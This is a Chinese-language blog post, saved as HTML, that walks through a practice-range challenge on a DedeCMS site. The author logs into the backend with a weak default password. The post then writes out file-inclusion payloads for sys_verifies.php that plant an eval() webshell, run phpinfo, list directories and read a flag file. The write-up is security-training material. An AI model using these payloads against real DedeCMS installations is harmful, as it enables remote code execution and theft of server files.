@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CSRF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1. CSRF 点开题目链接，审计一下题目 flag就在网站根目录 -&amp;gt; 盲猜需要用到文件包含的思路 后台密码为admin123 这么说需要找到后台，联想到本次作业为CSRF，登陆后台，借助管理员的Cookie就成立了 后台密码为admin123，盲猜用户名为admin或者root        点开链接 发现没有什么东西，网站目录也不是在根目录 右键查看源代码，ctrl+f搜索dedec">
+<meta name="keywords" content="CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF靶场--封神台">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;02&#x2F;CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0&#x2F;index.html">
+<meta property="og:site_name" content="Tomas&#39;Blog">
+<meta property="og:description" content="1. CSRF 点开题目链接，审计一下题目 flag就在网站根目录 -&amp;gt; 盲猜需要用到文件包含的思路 后台密码为admin123 这么说需要找到后台，联想到本次作业为CSRF，登陆后台，借助管理员的Cookie就成立了 后台密码为admin123，盲猜用户名为admin或者root        点开链接 发现没有什么东西，网站目录也不是在根目录 右键查看源代码，ctrl+f搜索dedec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-name.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-version.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-code.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-login.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-phpinfo.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-root.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-flag.png">
+<meta property="og:updated_time" content="2020-04-02T08:07:45.207Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;csrf&#x2F;dedecms&#x2F;csrf-name.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/02/CSRF靶场--封神台/"/>
+
+
+
+
+
+  <title>CSRF靶场--封神台 | Tomas'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tomas'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSRF靶场--封神台</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CSRF/" itemprop="url" rel="index">
+                    <span itemprop="name">CSRF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  566 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
+<li>点开题目链接，审计一下题目<ul>
+<li>flag就在网站根目录 -&gt; 盲猜需要用到文件包含的思路</li>
+<li>后台密码为admin123<ul>
+<li>这么说需要找到后台，联想到本次作业为CSRF，登陆后台，借助管理员的Cookie就成立了</li>
+<li>后台密码为admin123，盲猜用户名为admin或者root</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-name.png" alt="csrf-name"></p>
+<ul>
+<li>点开链接<ul>
+<li>发现没有什么东西，网站目录也不是在根目录</li>
+<li>右键查看源代码，ctrl+f搜索dedecms，可以发现dedecms的版本</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-version.png" alt="csrf-version"></p>
+<ul>
+<li>百度搜索dedecms，大多都是DedeCMS V57_UTF8_SP2版本的（真多漏洞）</li>
+<li>DedeCMS-V5.7_UTF8_SP1版本的，SQL注入，文件包含<ul>
+<li>只关心文件包含getshell的</li>
+</ul>
+</li>
+<li>发现一个CSDN上的链接<br>(weixin_33921089大佬的链接)[<a href="https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]</a></li>
+<li>分析源码可知，漏洞在/dede/sys_verifies.php下<ul>
+<li>需要一个url中输入action，即getfiles</li>
+<li>然后会打开一个cacheFile=DEDEDATA.’/modifytmp.inc文件</li>
+<li>开始输入，发现包含了一个php的头</li>
+<li>foreach输入然后进行replace，可以用反斜线双引号</li>
+<li>涉及payload为：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\\&quot;;eval($_GET[a]);die();//</code></li>
+</ul>
+</li>
+<li>这时候需要另外一个包含inc文件且能执行的，发现在后面的代码中，有一个通过action=down来执行，包含inc文件的，触发shell：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code></li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-code.png" alt="csrf-code"></p>
+<ul>
+<li>信息收集一下，发现后台是/csrf/uploads/dede/login.php<ul>
+<li>弱口令admin/admin123登陆成功</li>
+<li>这时候浏览器应该有管理员的Cookie了</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-login.png" alt="csrf-login"></p>
+<ul>
+<li>payload尝试<ul>
+<li>插入shell</li>
+<li>执行shell</li>
+<li>拿到phpinfo的信息</li>
+<li>搜索ducument，发现网站根目录</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-phpinfo.png" alt="csrf-phpinfo"></p>
+<ul>
+<li>既然有了shell，读取一下网站根目录</li>
+<li>payload<ul>
+<li>继续使用action=down</li>
+<li>写入dir的路径</li>
+<li>scandir扫描路径</li>
+<li>print打印输出所有的文件</li>
+<li>action=down&amp;a=$dir=dirname(‘C:/phpStudy/WWW/csrf/uploads/‘);$file = scandir($dir);print_r($file);</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-root.png" alt="csrf-root"> </p>
+<ul>
+<li>既然有了路径，那就读取吧</li>
+<li>payload：action=down&amp;a=readfile(‘C:/phpStudy/WWW/csrf/flag.php’);</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-flag.png" alt="csrf-flag"></p>
+<ul>
+<li>留有疑问<ul>
+<li>前面代码审计那里，payload的refiles[1]的绕过//“,是对什么的绕过？</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-靶场说明"><a href="#2-靶场说明" class="headerlink" title="2. 靶场说明"></a>2. 靶场说明</h4><ul>
+<li>⭐ 感谢白熊老哥提供的封神台靶场练习，跟真的在挖洞一样，难度倍增，收获也很多</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--pikachu/" rel="next" title="CSRF靶场--pikachu">
+                <i class="fa fa-chevron-left"></i> CSRF靶场--pikachu
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/photo.jpg"
+                alt="Tomas" />
+            
+              <p class="site-author-name" itemprop="name">Tomas</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">184</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-CSRF"><span class="nav-number">1.</span> <span class="nav-text">1. CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-靶场说明"><span class="nav-number">2.</span> <span class="nav-text">2. 靶场说明</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tomas</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">179.7k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
